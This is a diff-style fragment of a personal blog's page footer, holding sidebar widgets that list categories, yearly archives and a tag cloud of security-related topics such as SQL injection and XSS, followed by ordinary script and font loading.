+
+  
+        </div> 
+        <h2 class="widget-title section-title">Categories</h2>
+    <div class="widget-categories--list">
+<div class="widget">
+    <h3 class="widget-title"> </h3>
+    <div class="widget-body">
+        <div class="category-list">
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E5%B0%8F%E4%BA%BA%E8%81%94%E5%90%88%E5%B7%A5%E4%BC%9A/" class="category-list-link">小人联合工会<span class="category-list-count">1</a>
+            </span></div>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E6%95%B4%E7%82%B9%E5%B0%8F%E6%B4%BB/" class="category-list-link">整点小活<span class="category-list-count">6</a>
+            </span></div>
+            <div class="category-list-item"><a href="https://proben1.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-list-link">网络安全<span class="category-list-count">11</a>
+            </span></div>
+        </div>
+    </div>
+</div>
+    </div>
+    </section>
+        
+            <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Archives</h2>
+
+        
+        
+        
+        
+        
+        <div class="widget-archive--list">
+            <div class="archives-year">
+                    <a href="/archives/#2022">
+                        
+                            <span class="year">2022</span>
+                            <span class="count">9</span>
+                        
+                    </a> 
+                </div>
+            <div class="archives-year">
+                    <a href="/archives/#2021">
+                        
+                            <span class="year">2021</span>
+                            <span class="count">9</span>
+                        
+                    </a> 
+                </div>
+            
+        </div>
+    </section>
+        
+            <section class="widget tagCloud">
+    <div class="widget-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+    </div>
+    <h2 class="widget-title section-title">Tags</h2>
+
+    <div class="tagCloud-tags">
+        
+            <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="font_size_3">
+                SQL注入
+            </a>
+        
+            <a href="/tags/python/" class="font_size_2">
+                python
+            </a>
+        
+            <a href="/tags/docker/" class="font_size_1">
+                Docker
+            </a>
+        
+            <a href="/tags/git/" class="font_size_1">
+                git
+            </a>
+        
+            <a href="/tags/js/" class="font_size_1">
+                js
+            </a>
+        
+            <a href="/tags/sql/" class="font_size_1">
+                SQL
+            </a>
+        
+            <a href="/tags/thinkphp/" class="font_size_1">
+                thinkphp
+            </a>
+        
+            <a href="/tags/windows/" class="font_size_1">
+                Windows
+            </a>
+        
+            <a href="/tags/xss/" class="font_size_1">
+                xss
+            </a>
+        
+            <a href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" class="font_size_1">
+                二次注入
+            </a>
+        
+    </div>
+</section>
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
